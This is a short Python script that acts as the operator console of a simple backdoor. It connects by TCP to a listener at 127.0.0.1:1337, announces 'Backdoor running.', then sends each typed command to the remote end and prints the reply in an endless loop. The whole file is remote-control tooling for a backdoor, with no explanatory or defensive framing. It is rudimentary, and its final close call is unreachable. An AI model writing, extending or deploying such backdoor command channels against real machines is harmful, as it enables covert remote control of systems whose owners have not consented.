import socket

host = '127.0.0.1'
port = 1337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(bytes('Backdoor running.', "utf8"))

print("Connection established")
data = str(s.recv(1024))
while True:
    cmd = input("Command: ")
    s.send(bytes(cmd, "utf8"))
    data = str(s.recv(1024), "utf8")
    print(data)
s.close()